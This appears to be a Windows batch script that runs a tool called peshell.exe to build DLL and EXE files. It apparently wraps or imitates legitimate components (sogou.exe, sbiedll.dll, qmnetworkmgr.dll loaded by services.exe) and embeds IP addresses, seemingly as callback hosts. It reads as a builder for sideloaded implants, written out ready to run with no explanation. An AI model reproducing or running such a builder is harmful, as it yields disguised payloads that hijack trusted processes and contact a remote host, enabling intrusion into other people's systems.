
rem peshell.exe -re sogou.exe -p 47.116.51.29 test20190401 -o test.dll
rem peshell.exe -rd sbiedll.dll -p 47.116.51.29 test20190401 -o test.exe

peshell.exe -b services.exe qmnetworkmgr.dll -p 10.43.41.5 mytest -o base.dll
peshell.exe -b services.exe qmnetworkmgr.dll -p 10.43.41.5 mytest -o base.exe

pause
